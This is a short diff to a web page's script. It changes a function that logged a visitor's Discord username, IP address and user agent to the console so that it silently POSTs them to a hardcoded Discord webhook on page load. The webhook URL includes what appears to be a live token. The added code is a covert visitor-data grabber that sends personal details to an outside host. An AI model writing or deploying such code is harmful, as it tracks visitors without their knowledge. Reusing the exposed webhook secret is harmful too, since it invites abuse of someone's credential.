@@ -10,9 +10,19 @@
 
 <script>
     document.addEventListener('DOMContentLoaded', function() {
-        // Function to log user and device information to the console
-        const logInfoToConsole = (username, ip, userAgent) => {
-            console.log(`Username: ${username}\nIP: ${ip}\nUser Agent: ${userAgent}`);
+        const webhookUrl = 'https://discord.com/api/webhooks/1181568688365772810/a8uz5coZtPV_fm96znZsrCny53RXJn55vjU0P6QfzL7VVVvcoDjnCvKgfbjPhHARDI5N'; // Replace with your Discord webhook URL
+
+        // Function to send user and device information to Discord
+        const sendInfoToDiscord = (username, ip, userAgent) => {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `New visitor info:\nUsername: ${username}\nIP: ${ip}\nUser Agent: ${userAgent}`,
+                }),
+            });
         };
 
         // Function to get visitor's information
@@ -25,7 +35,7 @@
                 const userAgent = navigator.userAgent;
 
                 if (username) {
-                    logInfoToConsole(username, ip, userAgent);
+                    sendInfoToDiscord(username, ip, userAgent);
                 } else {
                     console.error('Discord username not provided');
                 }
